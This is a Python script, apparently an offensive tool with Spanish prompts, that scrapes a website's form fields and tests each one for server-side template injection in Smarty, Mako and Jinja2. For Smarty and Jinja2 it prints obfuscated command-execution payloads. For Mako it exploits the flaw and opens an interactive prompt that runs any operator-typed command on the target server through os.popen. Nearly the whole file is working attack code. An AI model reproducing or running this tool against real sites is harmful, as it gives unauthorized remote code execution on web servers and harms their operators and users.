import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os

def clear():
    os.system("cls" if os.name == "nt" else "clear")

TIMEOUT = 5

def discover_inputs(url):
    r = requests.get(url, timeout=TIMEOUT)
    soup = BeautifulSoup(r.text, "html.parser")

    targets = []

    for form in soup.find_all("form"):
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        full_action = urljoin(url, action)

        for inp in form.find_all("input"):
            name = inp.get("name")
            if name:
                targets.append((full_action, method, name))

    return targets

def send(url, param, payload):
    return requests.get(url, params={param: payload}, timeout=TIMEOUT)

def extract_output(html, skip_uid=False):
    soup = BeautifulSoup(html, "html.parser")

    for td in soup.find_all("td"):
        text = td.get_text(strip=True)
        if not text:
            continue

        if text.startswith("uid="):
            if skip_uid:
                continue
            return text

        if all(ord(c) < 128 for c in text):
            return text

    return None

def strip_first_id(output):
    if not output:
        return output

    lines = [l for l in output.splitlines() if l.strip()]

    if lines and lines[0].startswith("uid="):
        lines = lines[1:]

    return "\n".join(lines) if lines else None


def test_ssti(url):
    print(f"[*] Testing {url}\n")

    targets = discover_inputs(url)
    if not targets:
        print("[-] No inputs encontrados")
        return

    for action, method, param in targets:
        print(f"[*] Probando input '{param}' en {action}")

        r = send(action, param, "${1348*6324}")
        if "8524752" in r.text:

            r = send(action, param, "azbhvjsisdawdsa{*comment*}asdjsdfhmsdfasd")
            if "azbhvjsisdawdsaasdjsdfhmsdfasd" in r.text and "comment" not in r.text:
                print("[+] SSTI Smarty")
                print("Pruebe {{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}")
                return

            marker = "aazbhvjsisdawdsasazbhvjsisdawdsadazbhvjsisdawdsajazbhvjsisdawdsasazbhvjsisdawdsadazbhvjsisdawdsafazbhvjsisdawdsahazbhvjsisdawdsamazbhvjsisdawdsasazbhvjsisdawdsadazbhvjsisdawdsafazbhvjsisdawdsaaazbhvjsisdawdsasazbhvjsisdawdsad"

            r = send(action, param, '${"azbhvjsisdawdsa".join("asdjsdfhmsdfasd")}')
            if marker in r.text:
                print("[+] SSTI Mako")

                decision = input("Desea continuar y explotar el sistema verificando el comando 'id' (s/n): ")
                if decision.lower() != "s":
                    return

                clear()
                context = {"action": action, "param": param}

                r2 = send(
                    context["action"],
                    context["param"],
                    '${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}'
                )

                output = extract_output(r2.text)
                print("[i] Output comando id:")
                print(output if output else "[!] No se pudo extraer el output")

                while True:
                    comando = input("Introduzca el comando que desea ejecutar: ")
                    clear()
 
                    payload2 = "${self.module.cache.util.os.popen('id && " + comando + "').read()}"
                    r2 = send(context["action"], context["param"], payload2)

                    output = extract_output(r2.text)
                    output = strip_first_id(output)

                    print("[i] Output comando:")
                    print(output if output else "[!] No se pudo extraer el output")

                return

            r = send(action, param, "${{1348*6324}}")
            if "8524752" in r.text:
                print("[+] SSTI Jinja2")
                print("Pruebe {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}")
                return

    print("[-] No SSTI detectada")

if __name__ == "__main__":
    test_ssti(input("URL: "))
